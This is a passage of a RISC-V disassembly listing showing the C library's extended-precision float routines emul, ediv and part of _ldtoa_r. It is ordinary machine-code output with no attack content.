   13404:	85a2                	mv	a1,s0
   13406:	8556                	mv	a0,s5
   13408:	ee2ff0ef          	jal	ra,12aea <ecmpm>
   1340c:	4981                	li	s3,0
   1340e:	00a04763          	bgtz	a0,1341c <eiremain+0x78>
   13412:	85a2                	mv	a1,s0
   13414:	8556                	mv	a0,s5
   13416:	825ff0ef          	jal	ra,12c3a <esubm>
   1341a:	4985                	li	s3,1
   1341c:	855a                	mv	a0,s6
   1341e:	f2eff0ef          	jal	ra,12b4c <eshup1>
   13422:	04c95783          	lhu	a5,76(s2)
   13426:	8522                	mv	a0,s0
   13428:	14fd                	addi	s1,s1,-1
   1342a:	00f9e9b3          	or	s3,s3,a5
   1342e:	05391623          	sh	s3,76(s2)
   13432:	f1aff0ef          	jal	ra,12b4c <eshup1>
   13436:	b765                	j	133de <eiremain+0x3a>

0000000000013438 <emul>:
   13438:	7131                	addi	sp,sp,-192
   1343a:	f922                	sd	s0,176(sp)
   1343c:	f526                	sd	s1,168(sp)
   1343e:	f14a                	sd	s2,160(sp)
   13440:	ed4e                	sd	s3,152(sp)
   13442:	fd06                	sd	ra,184(sp)
   13444:	e952                	sd	s4,144(sp)
   13446:	e556                	sd	s5,136(sp)
   13448:	e15a                	sd	s6,128(sp)
   1344a:	fcde                	sd	s7,120(sp)
   1344c:	f8e2                	sd	s8,112(sp)
   1344e:	f4e6                	sd	s9,104(sp)
   13450:	84aa                	mv	s1,a0
   13452:	842e                	mv	s0,a1
   13454:	8932                	mv	s2,a2
   13456:	89b6                	mv	s3,a3
   13458:	87fff0ef          	jal	ra,12cd6 <eisnan>
   1345c:	c115                	beqz	a0,13480 <emul+0x48>
   1345e:	85ca                	mv	a1,s2
   13460:	8526                	mv	a0,s1
   13462:	e46ff0ef          	jal	ra,12aa8 <emov>
   13466:	70ea                	ld	ra,184(sp)
   13468:	744a                	ld	s0,176(sp)
   1346a:	74aa                	ld	s1,168(sp)
   1346c:	790a                	ld	s2,160(sp)
   1346e:	69ea                	ld	s3,152(sp)
   13470:	6a4a                	ld	s4,144(sp)
   13472:	6aaa                	ld	s5,136(sp)
   13474:	6b0a                	ld	s6,128(sp)
   13476:	7be6                	ld	s7,120(sp)
   13478:	7c46                	ld	s8,112(sp)
   1347a:	7ca6                	ld	s9,104(sp)
   1347c:	6129                	addi	sp,sp,192
   1347e:	8082                	ret
   13480:	8522                	mv	a0,s0
   13482:	855ff0ef          	jal	ra,12cd6 <eisnan>
   13486:	c501                	beqz	a0,1348e <emul+0x56>
   13488:	85ca                	mv	a1,s2
   1348a:	8522                	mv	a0,s0
   1348c:	bfd9                	j	13462 <emul+0x2a>
   1348e:	8526                	mv	a0,s1
   13490:	9cbff0ef          	jal	ra,12e5a <eisinf>
   13494:	e521                	bnez	a0,134dc <emul+0xa4>
   13496:	8522                	mv	a0,s0
   13498:	9c3ff0ef          	jal	ra,12e5a <eisinf>
   1349c:	c901                	beqz	a0,134ac <emul+0x74>
   1349e:	65e9                	lui	a1,0x1a
   134a0:	2c858593          	addi	a1,a1,712 # 1a2c8 <ezero>
   134a4:	8526                	mv	a0,s1
   134a6:	911ff0ef          	jal	ra,12db6 <ecmp>
   134aa:	c121                	beqz	a0,134ea <emul+0xb2>
   134ac:	8526                	mv	a0,s1
   134ae:	9adff0ef          	jal	ra,12e5a <eisinf>
   134b2:	e509                	bnez	a0,134bc <emul+0x84>
   134b4:	8522                	mv	a0,s0
   134b6:	9a5ff0ef          	jal	ra,12e5a <eisinf>
   134ba:	cd1d                	beqz	a0,134f8 <emul+0xc0>
   134bc:	8526                	mv	a0,s1
   134be:	83fff0ef          	jal	ra,12cfc <eisneg>
   134c2:	84aa                	mv	s1,a0
   134c4:	8522                	mv	a0,s0
   134c6:	837ff0ef          	jal	ra,12cfc <eisneg>
   134ca:	02a48463          	beq	s1,a0,134f2 <emul+0xba>
   134ce:	77e1                	lui	a5,0xffff8
   134d0:	00f91923          	sh	a5,18(s2)
   134d4:	854a                	mv	a0,s2
   134d6:	9a9ff0ef          	jal	ra,12e7e <einfin.isra.2>
   134da:	b771                	j	13466 <emul+0x2e>
   134dc:	65e9                	lui	a1,0x1a
   134de:	2c858593          	addi	a1,a1,712 # 1a2c8 <ezero>
   134e2:	8522                	mv	a0,s0
   134e4:	8d3ff0ef          	jal	ra,12db6 <ecmp>
   134e8:	f55d                	bnez	a0,13496 <emul+0x5e>
   134ea:	854a                	mv	a0,s2
   134ec:	b27ff0ef          	jal	ra,13012 <enan.constprop.12>
   134f0:	bf9d                	j	13466 <emul+0x2e>
   134f2:	00091923          	sh	zero,18(s2)
   134f6:	bff9                	j	134d4 <emul+0x9c>
   134f8:	8526                	mv	a0,s1
   134fa:	858a                	mv	a1,sp
   134fc:	821ff0ef          	jal	ra,12d1c <emovi>
   13500:	8522                	mv	a0,s0
   13502:	100c                	addi	a1,sp,32
   13504:	819ff0ef          	jal	ra,12d1c <emovi>
   13508:	00215403          	lhu	s0,2(sp)
   1350c:	02215483          	lhu	s1,34(sp)
   13510:	ec09                	bnez	s0,1352a <emul+0xf2>
   13512:	4781                	li	a5,0
   13514:	4759                	li	a4,22
   13516:	00f106b3          	add	a3,sp,a5
   1351a:	0026d683          	lhu	a3,2(a3)
   1351e:	c6e9                	beqz	a3,135e8 <emul+0x1b0>
   13520:	850a                	mv	a0,sp
   13522:	a5bff0ef          	jal	ra,12f7c <enormlz>
   13526:	40a00433          	neg	s0,a0
   1352a:	02215783          	lhu	a5,34(sp)
   1352e:	8c26                	mv	s8,s1
   13530:	ef81                	bnez	a5,13548 <emul+0x110>
   13532:	4759                	li	a4,22
   13534:	1014                	addi	a3,sp,32
   13536:	96be                	add	a3,a3,a5
   13538:	0026d683          	lhu	a3,2(a3)
   1353c:	cecd                	beqz	a3,135f6 <emul+0x1be>
   1353e:	1008                	addi	a0,sp,32
   13540:	a3dff0ef          	jal	ra,12f7c <enormlz>
   13544:	40a48c33          	sub	s8,s1,a0
   13548:	02015783          	lhu	a5,32(sp)
   1354c:	03498b93          	addi	s7,s3,52
   13550:	03898493          	addi	s1,s3,56
   13554:	02f99a23          	sh	a5,52(s3)
   13558:	02215783          	lhu	a5,34(sp)
   1355c:	8a5e                	mv	s4,s7
   1355e:	02f99b23          	sh	a5,54(s3)
   13562:	04e98793          	addi	a5,s3,78
   13566:	00049023          	sh	zero,0(s1)
   1356a:	0489                	addi	s1,s1,2
   1356c:	fe979de3          	bne	a5,s1,13566 <emul+0x12e>
   13570:	4a81                	li	s5,0
   13572:	4b01                	li	s6,0
   13574:	5cb1                	li	s9,-20
   13576:	015107b3          	add	a5,sp,s5
   1357a:	0187d503          	lhu	a0,24(a5) # ffffffffffff8018 <_end+0xfffffffffff374f8>
   1357e:	c909                	beqz	a0,13590 <emul+0x158>
   13580:	100c                	addi	a1,sp,32
   13582:	0090                	addi	a2,sp,64
   13584:	edeff0ef          	jal	ra,12c62 <m16m>
   13588:	85de                	mv	a1,s7
   1358a:	0088                	addi	a0,sp,64
   1358c:	e86ff0ef          	jal	ra,12c12 <eaddm>
   13590:	04c9d783          	lhu	a5,76(s3)
   13594:	855e                	mv	a0,s7
   13596:	1af9                	addi	s5,s5,-2
   13598:	00fb6b33          	or	s6,s6,a5
   1359c:	e54ff0ef          	jal	ra,12bf0 <eshdn6>
   135a0:	fd9a9be3          	bne	s5,s9,13576 <emul+0x13e>
   135a4:	101c                	addi	a5,sp,32
   135a6:	000a5703          	lhu	a4,0(s4)
   135aa:	0a09                	addi	s4,s4,2
   135ac:	0789                	addi	a5,a5,2
   135ae:	fee79f23          	sh	a4,-2(a5)
   135b2:	fe9a1ae3          	bne	s4,s1,135a6 <emul+0x16e>
   135b6:	76f1                	lui	a3,0xffffc
   135b8:	9462                	add	s0,s0,s8
   135ba:	0689                	addi	a3,a3,2
   135bc:	87ce                	mv	a5,s3
   135be:	04000713          	li	a4,64
   135c2:	96a2                	add	a3,a3,s0
   135c4:	4601                	li	a2,0
   135c6:	85da                	mv	a1,s6
   135c8:	1008                	addi	a0,sp,32
   135ca:	b75ff0ef          	jal	ra,1313e <emdnorm>
   135ce:	00015703          	lhu	a4,0(sp)
   135d2:	02015783          	lhu	a5,32(sp)
   135d6:	02f71463          	bne	a4,a5,135fe <emul+0x1c6>
   135da:	02011023          	sh	zero,32(sp)
   135de:	85ca                	mv	a1,s2
   135e0:	1008                	addi	a0,sp,32
   135e2:	a51ff0ef          	jal	ra,13032 <emovo.isra.6>
   135e6:	b541                	j	13466 <emul+0x2e>
   135e8:	0789                	addi	a5,a5,2
   135ea:	f2e796e3          	bne	a5,a4,13516 <emul+0xde>
   135ee:	854a                	mv	a0,s2
   135f0:	ca8ff0ef          	jal	ra,12a98 <eclear>
   135f4:	bd8d                	j	13466 <emul+0x2e>
   135f6:	0789                	addi	a5,a5,2
   135f8:	f2e79ee3          	bne	a5,a4,13534 <emul+0xfc>
   135fc:	bfcd                	j	135ee <emul+0x1b6>
   135fe:	57fd                	li	a5,-1
   13600:	02f11023          	sh	a5,32(sp)
   13604:	bfe9                	j	135de <emul+0x1a6>

0000000000013606 <ediv>:
   13606:	7131                	addi	sp,sp,-192
   13608:	f922                	sd	s0,176(sp)
   1360a:	f526                	sd	s1,168(sp)
   1360c:	f14a                	sd	s2,160(sp)
   1360e:	e556                	sd	s5,136(sp)
   13610:	fd06                	sd	ra,184(sp)
   13612:	ed4e                	sd	s3,152(sp)
   13614:	e952                	sd	s4,144(sp)
   13616:	e15a                	sd	s6,128(sp)
   13618:	fcde                	sd	s7,120(sp)
   1361a:	f8e2                	sd	s8,112(sp)
   1361c:	f4e6                	sd	s9,104(sp)
   1361e:	f0ea                	sd	s10,96(sp)
   13620:	84aa                	mv	s1,a0
   13622:	842e                	mv	s0,a1
   13624:	8932                	mv	s2,a2
   13626:	8ab6                	mv	s5,a3
   13628:	eaeff0ef          	jal	ra,12cd6 <eisnan>
   1362c:	c11d                	beqz	a0,13652 <ediv+0x4c>
   1362e:	85ca                	mv	a1,s2
   13630:	8526                	mv	a0,s1
   13632:	c76ff0ef          	jal	ra,12aa8 <emov>
   13636:	70ea                	ld	ra,184(sp)
   13638:	744a                	ld	s0,176(sp)
   1363a:	74aa                	ld	s1,168(sp)
   1363c:	790a                	ld	s2,160(sp)
   1363e:	69ea                	ld	s3,152(sp)
   13640:	6a4a                	ld	s4,144(sp)
   13642:	6aaa                	ld	s5,136(sp)
   13644:	6b0a                	ld	s6,128(sp)
   13646:	7be6                	ld	s7,120(sp)
   13648:	7c46                	ld	s8,112(sp)
   1364a:	7ca6                	ld	s9,104(sp)
   1364c:	7d06                	ld	s10,96(sp)
   1364e:	6129                	addi	sp,sp,192
   13650:	8082                	ret
   13652:	8522                	mv	a0,s0
   13654:	e82ff0ef          	jal	ra,12cd6 <eisnan>
   13658:	c501                	beqz	a0,13660 <ediv+0x5a>
   1365a:	85ca                	mv	a1,s2
   1365c:	8522                	mv	a0,s0
   1365e:	bfd1                	j	13632 <ediv+0x2c>
   13660:	69e9                	lui	s3,0x1a
   13662:	2c898593          	addi	a1,s3,712 # 1a2c8 <ezero>
   13666:	8526                	mv	a0,s1
   13668:	f4eff0ef          	jal	ra,12db6 <ecmp>
   1366c:	16050763          	beqz	a0,137da <ediv+0x1d4>
   13670:	8526                	mv	a0,s1
   13672:	fe8ff0ef          	jal	ra,12e5a <eisinf>
   13676:	89aa                	mv	s3,a0
   13678:	8522                	mv	a0,s0
   1367a:	fe0ff0ef          	jal	ra,12e5a <eisinf>
   1367e:	16099963          	bnez	s3,137f0 <ediv+0x1ea>
   13682:	16051c63          	bnez	a0,137fa <ediv+0x1f4>
   13686:	8526                	mv	a0,s1
   13688:	858a                	mv	a1,sp
   1368a:	e92ff0ef          	jal	ra,12d1c <emovi>
   1368e:	8522                	mv	a0,s0
   13690:	100c                	addi	a1,sp,32
   13692:	e8aff0ef          	jal	ra,12d1c <emovi>
   13696:	02215483          	lhu	s1,34(sp)
   1369a:	00215403          	lhu	s0,2(sp)
   1369e:	ec91                	bnez	s1,136ba <ediv+0xb4>
   136a0:	4781                	li	a5,0
   136a2:	4759                	li	a4,22
   136a4:	1014                	addi	a3,sp,32
   136a6:	96be                	add	a3,a3,a5
   136a8:	0026d683          	lhu	a3,2(a3) # ffffffffffffc002 <_end+0xfffffffffff3b4e2>
   136ac:	16068763          	beqz	a3,1381a <ediv+0x214>
   136b0:	1008                	addi	a0,sp,32
   136b2:	8cbff0ef          	jal	ra,12f7c <enormlz>
   136b6:	40a004b3          	neg	s1,a0
   136ba:	00215783          	lhu	a5,2(sp)
   136be:	8ba2                	mv	s7,s0
   136c0:	ef89                	bnez	a5,136da <ediv+0xd4>
   136c2:	4759                	li	a4,22
   136c4:	00f106b3          	add	a3,sp,a5
   136c8:	0026d683          	lhu	a3,2(a3)
   136cc:	14068b63          	beqz	a3,13822 <ediv+0x21c>
   136d0:	850a                	mv	a0,sp
   136d2:	8abff0ef          	jal	ra,12f7c <enormlz>
   136d6:	40a40bb3          	sub	s7,s0,a0
   136da:	02015783          	lhu	a5,32(sp)
   136de:	02215703          	lhu	a4,34(sp)
   136e2:	034a8993          	addi	s3,s5,52
   136e6:	02fa9a23          	sh	a5,52(s5)
   136ea:	038a8793          	addi	a5,s5,56
   136ee:	02ea9b23          	sh	a4,54(s5)
   136f2:	8a3e                	mv	s4,a5
   136f4:	04ea8713          	addi	a4,s5,78
   136f8:	0789                	addi	a5,a5,2
   136fa:	fe079f23          	sh	zero,-2(a5)
   136fe:	fee79de3          	bne	a5,a4,136f8 <ediv+0xf2>
   13702:	1008                	addi	a0,sp,32
   13704:	c10ff0ef          	jal	ra,12b14 <eshdn1>
   13708:	00615c03          	lhu	s8,6(sp)
   1370c:	6b41                	lui	s6,0x10
   1370e:	1b7d                	addi	s6,s6,-1
   13710:	036c0d33          	mul	s10,s8,s6
   13714:	01a98c93          	addi	s9,s3,26
   13718:	02415783          	lhu	a5,36(sp)
   1371c:	02615403          	lhu	s0,38(sp)
   13720:	07c2                	slli	a5,a5,0x10
   13722:	97a2                	add	a5,a5,s0
   13724:	845a                	mv	s0,s6
   13726:	00fd6663          	bltu	s10,a5,13732 <ediv+0x12c>
   1372a:	0387d433          	divu	s0,a5,s8
   1372e:	1442                	slli	s0,s0,0x30
   13730:	9041                	srli	s0,s0,0x30
   13732:	858a                	mv	a1,sp
   13734:	8522                	mv	a0,s0
   13736:	0090                	addi	a2,sp,64
   13738:	d2aff0ef          	jal	ra,12c62 <m16m>
   1373c:	100c                	addi	a1,sp,32
   1373e:	0088                	addi	a0,sp,64
   13740:	baaff0ef          	jal	ra,12aea <ecmpm>
   13744:	00a05f63          	blez	a0,13762 <ediv+0x15c>
   13748:	008c                	addi	a1,sp,64
   1374a:	850a                	mv	a0,sp
   1374c:	ceeff0ef          	jal	ra,12c3a <esubm>
   13750:	100c                	addi	a1,sp,32
   13752:	0088                	addi	a0,sp,64
   13754:	b96ff0ef          	jal	ra,12aea <ecmpm>
   13758:	0ea04163          	bgtz	a0,1383a <ediv+0x234>
   1375c:	347d                	addiw	s0,s0,-1
   1375e:	1442                	slli	s0,s0,0x30
   13760:	9041                	srli	s0,s0,0x30
   13762:	100c                	addi	a1,sp,32
   13764:	0088                	addi	a0,sp,64
   13766:	cd4ff0ef          	jal	ra,12c3a <esubm>
   1376a:	1008                	addi	a0,sp,32
   1376c:	008a1023          	sh	s0,0(s4)
   13770:	0a09                	addi	s4,s4,2
   13772:	c62ff0ef          	jal	ra,12bd4 <eshup6>
   13776:	fb9a11e3          	bne	s4,s9,13718 <ediv+0x112>
   1377a:	4781                	li	a5,0
   1377c:	4581                	li	a1,0
   1377e:	4759                	li	a4,22
   13780:	1014                	addi	a3,sp,32
   13782:	96be                	add	a3,a3,a5
   13784:	0046d683          	lhu	a3,4(a3)
   13788:	0789                	addi	a5,a5,2
   1378a:	8dd5                	or	a1,a1,a3
   1378c:	fee79ae3          	bne	a5,a4,13780 <ediv+0x17a>
   13790:	2581                	sext.w	a1,a1
   13792:	00b035b3          	snez	a1,a1
   13796:	101c                	addi	a5,sp,32
   13798:	0009d703          	lhu	a4,0(s3)
   1379c:	0989                	addi	s3,s3,2
   1379e:	0789                	addi	a5,a5,2
   137a0:	fee79f23          	sh	a4,-2(a5)
   137a4:	ff3a1ae3          	bne	s4,s3,13798 <ediv+0x192>
   137a8:	6691                	lui	a3,0x4
   137aa:	417484b3          	sub	s1,s1,s7
   137ae:	16fd                	addi	a3,a3,-1
   137b0:	87d6                	mv	a5,s5
   137b2:	04000713          	li	a4,64
   137b6:	96a6                	add	a3,a3,s1
   137b8:	4601                	li	a2,0
   137ba:	1008                	addi	a0,sp,32
   137bc:	983ff0ef          	jal	ra,1313e <emdnorm>
   137c0:	00015703          	lhu	a4,0(sp)
   137c4:	02015783          	lhu	a5,32(sp)
   137c8:	08f71163          	bne	a4,a5,1384a <ediv+0x244>
   137cc:	02011023          	sh	zero,32(sp)
   137d0:	85ca                	mv	a1,s2
   137d2:	1008                	addi	a0,sp,32
   137d4:	85fff0ef          	jal	ra,13032 <emovo.isra.6>
   137d8:	bdb9                	j	13636 <ediv+0x30>
   137da:	2c898593          	addi	a1,s3,712
   137de:	8522                	mv	a0,s0
   137e0:	dd6ff0ef          	jal	ra,12db6 <ecmp>
   137e4:	e80516e3          	bnez	a0,13670 <ediv+0x6a>
   137e8:	854a                	mv	a0,s2
   137ea:	829ff0ef          	jal	ra,13012 <enan.constprop.12>
   137ee:	b5a1                	j	13636 <ediv+0x30>
   137f0:	fd65                	bnez	a0,137e8 <ediv+0x1e2>
   137f2:	854a                	mv	a0,s2
   137f4:	aa4ff0ef          	jal	ra,12a98 <eclear>
   137f8:	bd3d                	j	13636 <ediv+0x30>
   137fa:	8526                	mv	a0,s1
   137fc:	d00ff0ef          	jal	ra,12cfc <eisneg>
   13800:	84aa                	mv	s1,a0
   13802:	8522                	mv	a0,s0
   13804:	cf8ff0ef          	jal	ra,12cfc <eisneg>
   13808:	02a48663          	beq	s1,a0,13834 <ediv+0x22e>
   1380c:	77e1                	lui	a5,0xffff8
   1380e:	00f91923          	sh	a5,18(s2)
   13812:	854a                	mv	a0,s2
   13814:	e6aff0ef          	jal	ra,12e7e <einfin.isra.2>
   13818:	bd39                	j	13636 <ediv+0x30>
   1381a:	0789                	addi	a5,a5,2
   1381c:	e8e794e3          	bne	a5,a4,136a4 <ediv+0x9e>
   13820:	bfc9                	j	137f2 <ediv+0x1ec>
   13822:	0789                	addi	a5,a5,2
   13824:	eae790e3          	bne	a5,a4,136c4 <ediv+0xbe>
   13828:	00015703          	lhu	a4,0(sp)
   1382c:	02015783          	lhu	a5,32(sp)
   13830:	fcf71ee3          	bne	a4,a5,1380c <ediv+0x206>
   13834:	00091923          	sh	zero,18(s2)
   13838:	bfe9                	j	13812 <ediv+0x20c>
   1383a:	3479                	addiw	s0,s0,-2
   1383c:	1442                	slli	s0,s0,0x30
   1383e:	008c                	addi	a1,sp,64
   13840:	850a                	mv	a0,sp
   13842:	9041                	srli	s0,s0,0x30
   13844:	bf6ff0ef          	jal	ra,12c3a <esubm>
   13848:	bf29                	j	13762 <ediv+0x15c>
   1384a:	57fd                	li	a5,-1
   1384c:	02f11023          	sh	a5,32(sp)
   13850:	b741                	j	137d0 <ediv+0x1ca>

0000000000013852 <_ldtoa_r>:
   13852:	db010113          	addi	sp,sp,-592
   13856:	ffe6                	sd	s9,504(sp)
   13858:	8cbe                	mv	s9,a5
   1385a:	09100793          	li	a5,145
   1385e:	e0ae                	sd	a1,64(sp)
   13860:	1782                	slli	a5,a5,0x20
   13862:	712c                	ld	a1,96(a0)
   13864:	17fd                	addi	a5,a5,-1
   13866:	24813023          	sd	s0,576(sp)
   1386a:	23413023          	sd	s4,544(sp)
   1386e:	21513c23          	sd	s5,536(sp)
   13872:	21713423          	sd	s7,520(sp)
   13876:	24113423          	sd	ra,584(sp)
   1387a:	22913c23          	sd	s1,568(sp)
   1387e:	23213823          	sd	s2,560(sp)
   13882:	23313423          	sd	s3,552(sp)
   13886:	21613823          	sd	s6,528(sp)
   1388a:	21813023          	sd	s8,512(sp)
   1388e:	fbea                	sd	s10,496(sp)
   13890:	f7ee                	sd	s11,488(sp)
   13892:	ec46                	sd	a7,24(sp)
   13894:	e4b2                	sd	a2,72(sp)
   13896:	eb3e                	sd	a5,400(sp)
   13898:	8a2a                	mv	s4,a0
   1389a:	8bb6                	mv	s7,a3
   1389c:	8aba                	mv	s5,a4
   1389e:	8442                	mv	s0,a6
   138a0:	c999                	beqz	a1,138b6 <_ldtoa_r+0x64>
   138a2:	5538                	lw	a4,104(a0)
   138a4:	4785                	li	a5,1
   138a6:	00e797bb          	sllw	a5,a5,a4
   138aa:	c598                	sw	a4,8(a1)
   138ac:	c5dc                	sw	a5,12(a1)
   138ae:	156010ef          	jal	ra,14a04 <_Bfree>
   138b2:	060a3023          	sd	zero,96(s4)
   138b6:	0088                	addi	a0,sp,64
   138b8:	188c                	addi	a1,sp,112
   138ba:	fcaff0ef          	jal	ra,13084 <e113toe.isra.8>
   138be:	1888                	addi	a0,sp,112
   138c0:	c3cff0ef          	jal	ra,12cfc <eisneg>
   138c4:	cd4d                	beqz	a0,1397e <_ldtoa_r+0x12c>
   138c6:	4785                	li	a5,1
   138c8:	c01c                	sw	a5,0(s0)
   138ca:	478d                	li	a5,3
   138cc:	0afb8c63          	beq	s7,a5,13984 <_ldtoa_r+0x132>
   138d0:	4951                	li	s2,20
   138d2:	000b8c63          	beqz	s7,138ea <_ldtoa_r+0x98>
   138d6:	fffa879b          	addiw	a5,s5,-1
   138da:	02a00713          	li	a4,42
   138de:	0007891b          	sext.w	s2,a5
   138e2:	00f75463          	ble	a5,a4,138ea <_ldtoa_r+0x98>
   138e6:	02a00913          	li	s2,42
   138ea:	19412783          	lw	a5,404(sp)
   138ee:	1888                	addi	a0,sp,112
   138f0:	f03e                	sd	a5,32(sp)
   138f2:	be4ff0ef          	jal	ra,12cd6 <eisnan>
   138f6:	842a                	mv	s0,a0
   138f8:	c941                	beqz	a0,13988 <_ldtoa_r+0x136>
   138fa:	0001a5b7          	lui	a1,0x1a
   138fe:	53058593          	addi	a1,a1,1328 # 1a530 <emtens+0x108>
   13902:	0a88                	addi	a0,sp,336
   13904:	6409                	lui	s0,0x2
   13906:	763010ef          	jal	ra,15868 <sprintf>
   1390a:	70f40413          	addi	s0,s0,1807 # 270f <_start-0xd9a1>
   1390e:	5782                	lw	a5,32(sp)
   13910:	1888                	addi	a0,sp,112
   13912:	1a812023          	sw	s0,416(sp)
   13916:	18f12a23          	sw	a5,404(sp)
   1391a:	d40ff0ef          	jal	ra,12e5a <eisinf>
   1391e:	15010993          	addi	s3,sp,336
   13922:	e511                	bnez	a0,1392e <_ldtoa_r+0xdc>
   13924:	1888                	addi	a0,sp,112
   13926:	bb0ff0ef          	jal	ra,12cd6 <eisnan>
   1392a:	6e050e63          	beqz	a0,14026 <_ldtoa_r+0x7d4>
   1392e:	6789                	lui	a5,0x2
   13930:	70f7879b          	addiw	a5,a5,1807
   13934:	00fca023          	sw	a5,0(s9)
   13938:	87ce                	mv	a5,s3
   1393a:	02000613          	li	a2,32
   1393e:	02d00693          	li	a3,45
   13942:	0007c703          	lbu	a4,0(a5) # 2000 <_start-0xe0b0>
   13946:	72c70463          	beq	a4,a2,1406e <_ldtoa_r+0x81c>
   1394a:	72d70263          	beq	a4,a3,1406e <_ldtoa_r+0x81c>
   1394e:	844e                	mv	s0,s3
   13950:	0785                	addi	a5,a5,1
   13952:	fff7c703          	lbu	a4,-1(a5)
   13956:	00140693          	addi	a3,s0,1
   1395a:	fee68fa3          	sb	a4,-1(a3) # 3fff <_start-0xc0b1>
   1395e:	70071b63          	bnez	a4,14074 <_ldtoa_r+0x822>
   13962:	4709                	li	a4,2
   13964:	4785                	li	a5,1
   13966:	00eb8863          	beq	s7,a4,13976 <_ldtoa_r+0x124>
   1396a:	1a012783          	lw	a5,416(sp)
   1396e:	0127d363          	ble	s2,a5,13974 <_ldtoa_r+0x122>
   13972:	87ca                	mv	a5,s2
   13974:	2781                	sext.w	a5,a5
   13976:	03000693          	li	a3,48
   1397a:	7060006f          	j	14080 <_ldtoa_r+0x82e>
   1397e:	00042023          	sw	zero,0(s0)
   13982:	b7a1                	j	138ca <_ldtoa_r+0x78>
   13984:	87d6                	mv	a5,s5
   13986:	bf91                	j	138da <_ldtoa_r+0x88>
   13988:	09000793          	li	a5,144
   1398c:	090c                	addi	a1,sp,144
   1398e:	1888                	addi	a0,sp,112
   13990:	18f12a23          	sw	a5,404(sp)
   13994:	914ff0ef          	jal	ra,12aa8 <emov>
   13998:	0a215783          	lhu	a5,162(sp)
   1399c:	e402                	sd	zero,8(sp)
   1399e:	0107971b          	slliw	a4,a5,0x10
   139a2:	4107571b          	sraiw	a4,a4,0x10
   139a6:	00075a63          	bgez	a4,139ba <_ldtoa_r+0x168>
   139aa:	6721                	lui	a4,0x8
   139ac:	177d                	addi	a4,a4,-1
   139ae:	8ff9                	and	a5,a5,a4
   139b0:	0af11123          	sh	a5,162(sp)
   139b4:	67c1                	lui	a5,0x10
   139b6:	17fd                	addi	a5,a5,-1
   139b8:	e43e                	sd	a5,8(sp)
   139ba:	6b69                	lui	s6,0x1a
   139bc:	2c8b0513          	addi	a0,s6,712 # 1a2c8 <ezero>
   139c0:	190c                	addi	a1,sp,176
   139c2:	0561                	addi	a0,a0,24
   139c4:	8e4ff0ef          	jal	ra,12aa8 <emov>
   139c8:	0a215703          	lhu	a4,162(sp)
   139cc:	64e9                	lui	s1,0x1a
   139ce:	2c8b0993          	addi	s3,s6,712
   139d2:	2e048493          	addi	s1,s1,736 # 1a2e0 <eone>
   139d6:	74071963          	bnez	a4,14128 <_ldtoa_r+0x8d6>
   139da:	091c                	addi	a5,sp,144
   139dc:	0a210713          	addi	a4,sp,162
   139e0:	0007d683          	lhu	a3,0(a5) # 10000 <_start-0xb0>
   139e4:	e6e1                	bnez	a3,13aac <_ldtoa_r+0x25a>
   139e6:	0789                	addi	a5,a5,2
   139e8:	fef71ce3          	bne	a4,a5,139e0 <_ldtoa_r+0x18e>
   139ec:	198c                	addi	a1,sp,240
   139ee:	1908                	addi	a0,sp,176
   139f0:	b2cff0ef          	jal	ra,12d1c <emovi>
   139f4:	190c                	addi	a1,sp,176
   139f6:	1988                	addi	a0,sp,240
   139f8:	8d6ff0ef          	jal	ra,12ace <emovz>
   139fc:	198c                	addi	a1,sp,240
   139fe:	0908                	addi	a0,sp,144
   13a00:	b1cff0ef          	jal	ra,12d1c <emovi>
   13a04:	090c                	addi	a1,sp,144
   13a06:	1988                	addi	a0,sp,240
   13a08:	8c6ff0ef          	jal	ra,12ace <emovz>
   13a0c:	0b10                	addi	a2,sp,400
